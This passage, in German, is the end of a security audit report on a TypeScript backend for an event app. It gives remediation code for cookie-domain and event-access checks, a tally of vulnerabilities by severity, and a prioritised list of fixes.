    throw new Error(`COOKIE_DOMAIN ${domain} does not match current domain`);
  }
  
  return domain;
}

const domain = validateCookieDomain(process.env.COOKIE_DOMAIN);
```

---

#### 7. **Event Access Cookie ohne Validierung**

**Datei:** `packages/backend/src/middleware/auth.ts:92-106`

**Problem:**
- `hasEventAccess` prüft nur Token-Validität
- Prüft nicht, ob Event existiert oder gelöscht wurde
- Token für gelöschte Events funktionieren noch

**Fix-Empfehlung:**
```typescript
export async function hasEventAccess(req: Request, eventId: string): Promise<boolean> {
  const jwtSecret = getJwtSecret();
  if (!jwtSecret) return false;

  const cookies = parseCookies(req);
  const token = cookies[getEventAccessCookieName(eventId)];
  if (!token) return false;

  try {
    const decoded = jwt.verify(token, jwtSecret) as any;
    if (decoded?.type !== 'event_access' || decoded?.eventId !== eventId) {
      return false;
    }
    
    // Prüfe Event-Existenz
    const event = await prisma.event.findUnique({
      where: { id: eventId },
      select: { id: true, deletedAt: true, isActive: true },
    });
    
    if (!event || event.deletedAt || event.isActive === false) {
      return false;
    }
    
    return true;
  } catch {
    return false;
  }
}
```

---

### 🟢 NIEDRIG

#### 8-10. **Code Quality Issues**

Siehe Optimierungsvorschläge

---

## ✨ Features-Übersicht

*(Unverändert - siehe vorherige Analyse)*

---

## 🚀 Optimierungsvorschläge (Detailliert)

*(Erweitert mit detaillierten Code-Beispielen - siehe vorherige Analyse)*

---

## 📊 Zusammenfassung

### Sicherheitslücken
- **Kritisch:** 5 (CVSS 8.1-10.0)
- **Mittel:** 7 (CVSS 4.3-7.5)
- **Niedrig:** 3 (CVSS 1.0-3.1)
- **Gesamt:** 15

### Fehler & Bugs
- **Kritisch:** 3
- **Mittel:** 4
- **Niedrig:** 3
- **Gesamt:** 10

### Features
- **Implementiert:** 50+
- **Kategorien:** 15+

### Optimierungsvorschläge
- **Performance:** 5
- **Code Quality:** 4
- **Security:** 3
- **Monitoring:** 3
- **UX:** 3
- **Infrastructure:** 2
- **Gesamt:** 20

---

## 🎯 Prioritäten

### Sofort (Kritisch - Diese Woche)
1. ✅ Hardcoded Credentials entfernen (Storage, JWT, IP Hash)
2. ✅ Filename Sanitization implementieren
3. ✅ Email Template XSS beheben (HTML-Escaping)
4. ✅ CSRF-Protection implementieren
5. ✅ Redis Keys() durch SCAN ersetzen

### Kurzfristig (1-2 Wochen)
1. CSP ohne unsafe-inline/unsafe-eval
2. Rate Limiting anpassen (stufenweise)
3. Input-Validierung erweitern (Zod-Schemas)
4. Error Handling standardisieren
5. Database Query Optimization

### Mittelfristig (1-3 Monate)
1. Monitoring & Metrics (Sentry, Prometheus)
2. Code Quality Verbesserungen (TypeScript Strict)
3. Performance-Optimierungen (Caching, Pagination)
4. UX-Verbesserungen (Loading States, Error Messages)
5. CI/CD Pipeline (GitHub Actions)

---

**Ende der detaillierten Analyse**


